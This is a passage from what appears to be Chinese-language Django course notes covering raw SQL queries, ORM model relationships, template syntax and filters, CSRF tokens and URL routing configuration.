class=\"string\">&#x27;xian&#x27;</span>])</span><br></pre></td></tr></table></figure></li>\n</ol>\n</li>\n<li><p>使用django.db.connection数据库连接对象进行原生SQL查询。</p>\n<p>connection对象表示与数据库连接的对象，可以通过connection连接对象获取游标cursor对象，再通过cursor的execute()/fetchall()/rowcount相关方法或函数来执行原生的SQL和执行结果。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cursor = connection.cursor()</span><br><span class=\"line\">cursor.execute(<span class=\"string\">&#x27;select * from t_fruit&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> row <span class=\"keyword\">in</span> cursor.fetchall():</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(row)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cursor.execute(<span class=\"string\">&#x27;update t_fruit set price=2 where id=1&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(cursor.rowcount)</span><br><span class=\"line\">connection.commit()  <span class=\"comment\"># 提交更新</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"三、模型类之间的关系\"><a href=\"#三、模型类之间的关系\" class=\"headerlink\" title=\"三、模型类之间的关系\"></a>三、模型类之间的关系</h2><h3 id=\"3-1-扩展：显性方式创建objects\"><a href=\"#3-1-扩展：显性方式创建objects\" class=\"headerlink\" title=\"3.1 扩展：显性方式创建objects\"></a>3.1 扩展：显性方式创建objects</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OrderManager</span>(models.Manager):</span><br><span class=\"line\">\t<span class=\"keyword\">def</span> <span class=\"title function_\">get_queryset</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>().get_queryset().<span class=\"built_in\">filter</span>(~models.Q(pay_status=<span class=\"number\">5</span>))</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 统计2018年全年销售总额</span></span><br><span class=\"line\">OrderModel.objects.<span class=\"built_in\">filter</span>(create_time__year=<span class=\"number\">2018</span>).aggregate(total_price=Sum(<span class=\"string\">&#x27;price&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-2-一对一关系\"><a href=\"#3-2-一对一关系\" class=\"headerlink\" title=\"3.2 一对一关系\"></a>3.2 一对一关系</h3><p>一对一的关系可以通过models.OneToOneField(关联模型类, on_delete=models.CASCADE)建立，on_delete除了CASCADE级联删除之外，还有models.SET_NULL级联设置为null。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RealProfile</span>(models.Model):</span><br><span class=\"line\">    <span class=\"comment\"># 声明一对一的关联关系</span></span><br><span class=\"line\">    user = models.OneToOneField(UserEntity, verbose_name=<span class=\"string\">&#x27;账号&#x27;</span>, on_delete=models.CASCADE)</span><br><span class=\"line\">    real_name = models.CharField(max_length=<span class=\"number\">20</span>, verbose_name=<span class=\"string\">&#x27;真实姓名&#x27;</span>)</span><br><span class=\"line\">    number = models.CharField(max_length=<span class=\"number\">30</span>, verbose_name=<span class=\"string\">&#x27;证件号&#x27;</span>)</span><br><span class=\"line\">    real_type = models.IntegerField(verbose_name=<span class=\"string\">&#x27;证件类型&#x27;</span>, choices=((<span class=\"number\">0</span>, <span class=\"string\">&#x27;身份证&#x27;</span>), (<span class=\"number\">1</span>, <span class=\"string\">&#x27;护照&#x27;</span>), (<span class=\"number\">2</span>, <span class=\"string\">&#x27;驾驶证&#x27;</span>)))</span><br><span class=\"line\">    image1 = models.ImageField(upload_to=<span class=\"string\">&#x27;user/real&#x27;</span>, verbose_name=<span class=\"string\">&#x27;正面照&#x27;</span>)</span><br><span class=\"line\">    image2 = models.ImageField(upload_to=<span class=\"string\">&#x27;user/real&#x27;</span>, verbose_name=<span class=\"string\">&#x27;反面照&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>主表：用户表，从表：实名认证表</p>\n<p>从表对象获取主表的数据</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u1 = RealProfile.objects.<span class=\"built_in\">filter</span>(real_name=<span class=\"string\">&#x27;狄青&#x27;</span>).first()</span><br><span class=\"line\">u1.user.phone  <span class=\"comment\"># 直接访问主表对象的数据</span></span><br></pre></td></tr></table></figure>\n\n<p>主表中获取从表的数据</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">login_u1 = UserEntity.objects.get(pk=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># 以隐性方式 读取从表的数据：对象.关联模型类全小写名称.属性</span></span><br><span class=\"line\">login_u1.realprofile.number  <span class=\"comment\"># realprofile 一对一的关系模型类的名称（全小写）</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-3-一对多或多对一的关系\"><a href=\"#3-3-一对多或多对一的关系\" class=\"headerlink\" title=\"3.3 一对多或多对一的关系\"></a>3.3 一对多或多对一的关系</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 声明水果商品与购物车的关系表</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">FruitCartEntity</span>(models.Model):</span><br><span class=\"line\">    cart = models.ForeignKey(CartEntity, on_delete=models.CASCADE, verbose_name=<span class=\"string\">&#x27;购物车&#x27;</span>)</span><br><span class=\"line\">    fruit = models.ForeignKey(FruitEntity, on_delete=models.CASCADE, verbose_name=<span class=\"string\">&#x27;水果名&#x27;</span>)</span><br><span class=\"line\">    cnt = models.IntegerField(verbose_name=<span class=\"string\">&#x27;数量&#x27;</span>, default=<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__str__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.fruit.name + <span class=\"string\">&#x27;:&#x27;</span> + self.cart.no</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @property</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">price1</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> self.fruit.price  <span class=\"comment\"># 从获取主的对象属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @property</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">price</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 属性方法在后台显示时没有verbose_name，如何解决？</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">round</span>(self.fruit.price * self.cnt, <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">Meta</span>:</span><br><span class=\"line\">        db_table = <span class=\"string\">&#x27;t_fruit_cart&#x27;</span></span><br><span class=\"line\">        verbose_name = <span class=\"string\">&#x27;购物车详情表&#x27;</span></span><br><span class=\"line\">        verbose_name_plural = verbose_name</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 主读取多个从对象的信息</span></span><br><span class=\"line\">login_u = UserEntity.objects.get(pk=<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\"># 查询当前用户的购物车中的所有商品及数量相关的信息</span></span><br><span class=\"line\">cart_fruit = login_u.cartentity.fruitcartentity_set.<span class=\"built_in\">all</span>()</span><br><span class=\"line\"><span class=\"keyword\">for</span> fruit_cart <span class=\"keyword\">in</span> cart_fruits:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(fruit_cart.fruit.name, fruit_cart.fruit.price, fruit_cart.cnt)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-4-多对多\"><a href=\"#3-4-多对多\" class=\"headerlink\" title=\"3.4 多对多\"></a>3.4 多对多</h3><p>models.ManyToManyField()</p>\n<h1 id=\"WEB后端服务第14天-Django第四天\"><a href=\"#WEB后端服务第14天-Django第四天\" class=\"headerlink\" title=\"WEB后端服务第14天-Django第四天\"></a>WEB后端服务第14天-Django第四天</h1><h2 id=\"一、模型关系的深入应用\"><a href=\"#一、模型关系的深入应用\" class=\"headerlink\" title=\"一、模型关系的深入应用\"></a>一、模型关系的深入应用</h2><h3 id=\"1-1-多对多的应用\"><a href=\"#1-1-多对多的应用\" class=\"headerlink\" title=\"1.1 多对多的应用\"></a>1.1 多对多的应用</h3><p>需求：用户收藏商品，需要建立第三方表，完成用户收藏多个商品，或一个商品被多位用户收藏。</p>\n<p>在FruitEntity模型类中，增加users属性，内容如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 默认情况下，反向引用的名称是当前类的名称（小写）_set，可以通过related_name来指定</span></span><br><span class=\"line\">    <span class=\"comment\"># db_table=&#x27;t_collect&#x27; 使用第三张表建立fruit和user的多对多关系</span></span><br><span class=\"line\">    users = models.ManyToManyField(UserEntity, db_table=<span class=\"string\">&#x27;t_collect&#x27;</span>, related_name=<span class=\"string\">&#x27;fruits&#x27;</span>, verbose_name=<span class=\"string\">&#x27;收藏用户列表&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>当迁移完成后，模拟用户收藏商品：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u1 = UserEntity.objects.get(pk=<span class=\"number\">1</span>)</span><br><span class=\"line\">u1.fruits.add(FruitEntity.objects.get(pk=<span class=\"number\">1</span>))</span><br><span class=\"line\">u1.fruits.add(FruitEntity.objects.get(pk=<span class=\"number\">2</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">u2 = UserEntity.objects.get(pk=<span class=\"number\">2</span>)</span><br><span class=\"line\">u2.fruits.add(FruitEntity.objects.get(pk=<span class=\"number\">2</span>))</span><br></pre></td></tr></table></figure>\n\n<p>查看某一件商品，被哪些用户收藏</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">fruit1 = FruitEntity.objects.get(pk=<span class=\"number\">2</span>)</span><br><span class=\"line\">fruit1.users.<span class=\"built_in\">all</span>()</span><br></pre></td></tr></table></figure>\n\n<p>用户取消收藏商品</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">u1.fruits.remove(FruitEntity.objects.get(pk=<span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n\n<p>任务：增加标签模型类（id, name, order_num）并且和商品建立多对多的关系</p>\n<p>问题：模型类自关联</p>\n<h2 id=\"二、模板语法\"><a href=\"#二、模板语法\" class=\"headerlink\" title=\"二、模板语法\"></a>二、模板语法</h2><h3 id=\"2-1-MTV设计中TV的关系\"><a href=\"#2-1-MTV设计中TV的关系\" class=\"headerlink\" title=\"2.1 MTV设计中TV的关系\"></a>2.1 MTV设计中TV的关系</h3><ul>\n<li>V视图处理函数可以渲染（使用）多个模板</li>\n<li>一个模板T可以被任意的V视图函数使用</li>\n</ul>\n<h3 id=\"2-2-模板的加载过程\"><a href=\"#2-2-模板的加载过程\" class=\"headerlink\" title=\"2.2 模板的加载过程\"></a>2.2 模板的加载过程</h3><p>模板加载对象：django.template.loader</p>\n<ul>\n<li><p>加载</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">template = loader.get_template(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></li>\n<li><p>渲染</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">html = template.render(context)  <span class=\"comment\"># context是一个dict类型对象</span></span><br></pre></td></tr></table></figure></li>\n<li><p>加载+渲染</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">html = loader.render_to_string(<span class=\"string\">&quot;index.html&quot;</span>, context)</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-3-模板中使用“-”点语法\"><a href=\"#2-3-模板中使用“-”点语法\" class=\"headerlink\" title=\"2.3 模板中使用“.”点语法\"></a>2.3 模板中使用“.”点语法</h3><p>使用“.”访问变量Variable的属性，系统尝试以下顺序查询：</p>\n<ul>\n<li><p>字典</p>\n</li>\n<li><p>属性或方法</p>\n</li>\n<li><p>列表的数值索引</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span>&gt;</span>&#123;&#123; msg &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: green&quot;</span>&gt;</span></span><br><span class=\"line\">        第三个用户名：&#123;&#123; users.2.name &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: red;&quot;</span>&gt;</span></span><br><span class=\"line\">        请客的人：&#123;&#123; error_index &#125;&#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">style</span>=<span class=\"string\">&quot;color: white; background-color: blue;&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>VIP:<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>&#123;&#123; vip.name.upper &#125;&#125;-&#123;&#123; vip.money &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">        &#123;% for key, value in vip.items %&#125;</span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>&#123;&#123; key &#125;&#125; = &#123;&#123; value &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">user_list3</span>(<span class=\"params\">request</span>):</span><br><span class=\"line\">    users = UserEntity.objects.<span class=\"built_in\">all</span>()</span><br><span class=\"line\">    msg = <span class=\"string\">&#x27;the best&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    error_index = random.randint(<span class=\"number\">0</span>, users.count()-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    vip = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;name&#x27;</span>: <span class=\"string\">&#x27;disen&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;money&#x27;</span>: <span class=\"number\">20000</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># # 加载模板</span></span><br><span class=\"line\">    <span class=\"comment\"># template = loader.get_template(&#x27;user/list.html&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># # 渲染模板</span></span><br><span class=\"line\">    <span class=\"comment\"># html = template.render(context=&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">#     &#x27;msg&#x27;: msg,</span></span><br><span class=\"line\">    <span class=\"comment\">#     &#x27;users&#x27;: users,</span></span><br><span class=\"line\">    <span class=\"comment\"># &#125;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    html = loader.render_to_string(<span class=\"string\">&#x27;user/list.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(html, status=<span class=\"number\">200</span>)  <span class=\"comment\"># 增加响应头？？</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"2-4-表达式标签\"><a href=\"#2-4-表达式标签\" class=\"headerlink\" title=\"2.4 表达式标签\"></a>2.4 表达式标签</h3><ul>\n<li><p><code>&#123;% if 条件 %&#125; &#123;% endif %&#125;</code></p>\n<ul>\n<li>条件表达式支持关系运算符<ul>\n<li>or</li>\n<li>and</li>\n<li>not</li>\n<li>in</li>\n<li>==、!=、&gt;、&lt;、&gt;=、&lt;=</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><code>&#123;% ifequal 值1 值2 %&#125; &#123;% endifequal %&#125;</code></p>\n</li>\n<li><p><code>&#123;% ifnotequal 值1 值2 %&#125; &#123;% endifnotequal %&#125;</code></p>\n<p>The <code>&#123;% ifequal %&#125; and &#123;% ifnotequal %&#125;</code>template tags are removed in django4.0.</p>\n</li>\n<li><p><code>&#123;% for 变量 in 可迭代对象 %&#125;  &#123;% endfor %&#125;</code></p>\n<ul>\n<li><code>&#123;% empty %&#125;</code>当可迭代对象为空（非None），显示empty标签下面的内容</li>\n<li><code>&#123;% cycle  值1 值2 值3 值4 %&#125;</code></li>\n<li><code>&#123;&#123; forloop.counter &#125;&#125;</code> 循环计数器，从1开始</li>\n</ul>\n</li>\n<li><p>注释：渲染模板之后不会存在</p>\n<ul>\n<li><code>&#123;# 单行注释 #&#125;</code></li>\n<li><code>&#123;% comment %&#125; 多行注释的文本 &#123;% endcomment %&#125;</code></li>\n</ul>\n</li>\n<li><p>escape 安全标签</p>\n<ul>\n<li><code>&#123;% autoescape on|off %&#125;</code> 开启escape时，会将变量的 大于号、小于号、单引号、双引号及&amp;等转成escape的表示，如大于号为 &amp;gt;</li>\n<li><code>&#123;&#123; info|escape &#125;&#125;</code> escape也可以换成safe表示不转换escape.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-5-模板的过滤器\"><a href=\"#2-5-模板的过滤器\" class=\"headerlink\" title=\"2.5 模板的过滤器\"></a>2.5 模板的过滤器</h3><ul>\n<li><p>数值运算</p>\n<ul>\n<li>| add:5</li>\n<li>| add:-5</li>\n<li>| divisibleby:2</li>\n<li>| <code>&#123;% widthratio 变量 分母 分子 %&#125;</code></li>\n</ul>\n</li>\n<li><p>字符串</p>\n</li>\n<li><p>格式化</p>\n<ul>\n<li><p>日期格式化</p>\n<p><code>now|date:&quot;Y-m-d H:i:s&quot;</code></p>\n</li>\n<li><p>文件大小格式化</p>\n<p><code>file_size|filesizeformat</code></p>\n</li>\n<li><p>小数值格式化</p>\n<figure class=\"highlight plaintext\"><figcaption><span>默认n是1位小数</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 列表</span><br><span class=\"line\"></span><br><span class=\"line\">- HTML转义</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n 不转义\n 转义，显示html源码标签\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">- 默认值</span><br><span class=\"line\"></span><br><span class=\"line\">### 2.6 自定义过滤器</span><br><span class=\"line\"></span><br><span class=\"line\">在app的init.py脚本编写</span><br><span class=\"line\"></span><br><span class=\"line\">```python</span><br><span class=\"line\">from django.template.defaultfilters import register</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">@register.filter(&#x27;ellipse&#x27;)</span><br><span class=\"line\">def ellipse(value):</span><br><span class=\"line\">    return os.path.split(value)[-1]</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-7-扩展：os-stat-获取文件大小\"><a href=\"#2-7-扩展：os-stat-获取文件大小\" class=\"headerlink\" title=\"2.7 扩展：os.stat()获取文件大小\"></a>2.7 扩展：os.stat()获取文件大小</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">file_dir = os.path.join(settings.BASE_DIR, <span class=\"string\">&#x27;mainapp/&#x27;</span>)</span><br><span class=\"line\">    files = &#123; file_name:os.stat(</span><br><span class=\"line\">        file_dir+file_name) <span class=\"keyword\">for</span> file_name <span class=\"keyword\">in</span> os.listdir(file_dir) <span class=\"keyword\">if</span> os.path.isfile(file_dir+file_name) &#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"WEB后端服务第15天-Django第五天\"><a href=\"#WEB后端服务第15天-Django第五天\" class=\"headerlink\" title=\"WEB后端服务第15天-Django第五天\"></a>WEB后端服务第15天-Django第五天</h1><h2 id=\"一、csrf（防止跨站请求伪造）\"><a href=\"#一、csrf（防止跨站请求伪造）\" class=\"headerlink\" title=\"一、csrf（防止跨站请求伪造）\"></a>一、csrf（防止跨站请求伪造）</h2><h3 id=\"1-1-csrf-token标签\"><a href=\"#1-1-csrf-token标签\" class=\"headerlink\" title=\"1.1 csrf_token标签\"></a>1.1 csrf_token标签</h3><p>在模板的<code>&lt;form&gt;</code>内部使用即可，会生成隐藏字段，名称为csrfmiddlewaretoken，它的值是在渲染模板时产生的，并存储在session，当表单提交到后端时，通过csrfMiddleWare中间件验证。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;form&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span>&gt;</span></span><br><span class=\"line\">            &#123;% csrf_token %&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>注意：只针对post请求</p>\n<p>扩展1：make_password和check_password</p>\n<p>扩展2：request.session</p>\n<h3 id=\"1-2-取消csrf\"><a href=\"#1-2-取消csrf\" class=\"headerlink\" title=\"1.2 取消csrf\"></a>1.2 取消csrf</h3><ul>\n<li>在settings.py的中间件的配置中，将CsrfViewMiddleware删除</li>\n<li><code>@csrf_exempt</code>装饰view处理函数</li>\n</ul>\n<h2 id=\"二、模板布局标签\"><a href=\"#二、模板布局标签\" class=\"headerlink\" title=\"二、模板布局标签\"></a>二、模板布局标签</h2><h3 id=\"2-1-block-extends-include\"><a href=\"#2-1-block-extends-include\" class=\"headerlink\" title=\"2.1 block/extends/include\"></a>2.1 block/extends/include</h3><h3 id=\"2-2-显示父模板的内容\"><a href=\"#2-2-显示父模板的内容\" class=\"headerlink\" title=\"2.2 显示父模板的内容\"></a>2.2 显示父模板的内容</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123; block.super &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、app模块内部模板\"><a href=\"#三、app模块内部模板\" class=\"headerlink\" title=\"三、app模块内部模板\"></a>三、app模块内部模板</h2><ul>\n<li>每个app下都可以增加templates目录，存放它自己的模板文件</li>\n<li>内部的模板templates目录，不需要在settings.py中设置</li>\n<li>如果app模块之外存在templates目录，且在settings.py中已设置，则加载模板时，则优先从此目录中加载模板文件。</li>\n</ul>\n<h2 id=\"四、URL路由配置\"><a href=\"#四、URL路由配置\" class=\"headerlink\" title=\"四、URL路由配置\"></a>四、URL路由配置</h2><h3 id=\"4-1-URL分二级（总路由和子路由（app模块的路由））\"><a href=\"#4-1-URL分二级（总路由和子路由（app模块的路由））\" class=\"headerlink\" title=\"4.1 URL分二级（总路由和子路由（app模块的路由））\"></a>4.1 URL分二级（总路由和子路由（app模块的路由））</h3><ul>\n<li><p>主工程目录下urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">\tpath(<span class=\"string\">&#x27;url&#x27;</span>, 视图函数, name=<span class=\"literal\">None</span>),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;url/&#x27;</span>, include(<span class=\"string\">&#x27;app_label.urls&#x27;</span>, namespace=<span class=\"literal\">None</span>))  <span class=\"comment\"># 包含子路由</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></li>\n<li><p>app目录下的urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">\tpath(<span class=\"string\">&#x27;url&#x27;</span>, 视图函数, name=<span class=\"literal\">None</span>),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>include的namespace和path的name都在反向解析中使用，即反向获取url路径：<code>namespace.name</code></p>\n<h3 id=\"4-2-url和path两种路由的配置\"><a href=\"#4-2-url和path两种路由的配置\" class=\"headerlink\" title=\"4.2 url和path两种路由的配置\"></a>4.2 url和path两种路由的配置</h3><p>url()配置兼容Django1.x的老版本</p>\n<p>path()，re_path()是Django2之后的路由函数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.urls <span class=\"keyword\">import</span> path</span><br><span class=\"line\"><span class=\"keyword\">from</span> django.urls <span class=\"keyword\">import</span> re_path</span><br><span class=\"line\"><span class=\"comment\"># from django.conf.urls import url</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> orderapp <span class=\"keyword\">import</span> views</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;list&#x27;</span>, views.order_list),</span><br><span class=\"line\">    re_path(<span class=\"string\">r&#x27;^list2$&#x27;</span>, views.order_list),</span><br><span class=\"line\">    <span class=\"comment\"># url(r&#x27;^list2$&#x27;, views.order_list),</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>url()支持正则，通过正则在url路径中向处理函数传参：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url(<span class=\"string\">r&#x27;^list2/(?P&lt;city_code&gt;\\w+)/(?P&lt;order_num&gt;\\d+)$&#x27;</span>, views.order_list),</span><br><span class=\"line\"><span class=\"comment\"># re_path(r&#x27;^list2/(?P&lt;city_code&gt;\\w+)/(?P&lt;order_num&gt;\\d+)$&#x27;, views.order_list),</span></span><br></pre></td></tr></table></figure>\n\n<p>以上是按关键传参方式。也可以按位置传参(从左到右)，如下所示</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url(<span class=\"string\">r&#x27;^list2/(\\w+)/(\\d+)$&#x27;</span>, views.order_list),</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">order_list</span>(<span class=\"params\">request, order_num, city_code</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(order_num, city_code)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;list_order.html&#x27;</span>, <span class=\"built_in\">locals</span>())</span><br></pre></td></tr></table></figure>\n\n<p>以上的url路由传参可以使用path()的<code>&lt;name&gt;</code>实现，如：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">path(<span class=\"string\">&#x27;list/&lt;city_code&gt;/&lt;order_num&gt;&#x27;</span>, views.order_list),</span><br></pre></td></tr></table></figure>\n\n<p>如果路由中的参数是uuid类型，则使用参数转换器进行匹配，如</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">path(<span class=\"string\">&#x27;cancel/&lt;uuid:order_num&gt;&#x27;</span>, views.cancel_order),</span><br></pre></td></tr></table></figure>\n\n<p>除了uuid转换器之外，还有str, int, slug。如果路由中参数的规则比较复杂时，建议使用re_path()配置路由中的参数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">re_path(<span class=\"string\">r&#x27;^search/(?P&lt;phone&gt;1[3-57-9][\\d]&#123;9&#125;)$&#x27;</span>, views.search),</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">search</span>(<span class=\"params\">request, phone</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpResponse(<span class=\"string\">&#x27;hi, phone: %s&#x27;</span> % phone)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、反向解析\"><a href=\"#五、反向解析\" class=\"headerlink\" title=\"五、反向解析\"></a>五、反向解析</h2><h3 id=\"5-1-使用include的namespace和path的name属性\"><a href=\"#5-1-使用include的namespace和path的name属性\" class=\"headerlink\" title=\"5.1 使用include的namespace和path的name属性\"></a>5.1 使用include的namespace和path的name属性</h3><p>主路由：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">path(<span class=\"string\">&#x27;order/&#x27;</span>, include(<span class=\"string\">&#x27;orderapp.urls&#x27;</span>, namespace=<span class=\"string\">&#x27;order&#x27;</span>)),</span><br></pre></td></tr></table></figure>\n\n<p>子路由：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">app_name = <span 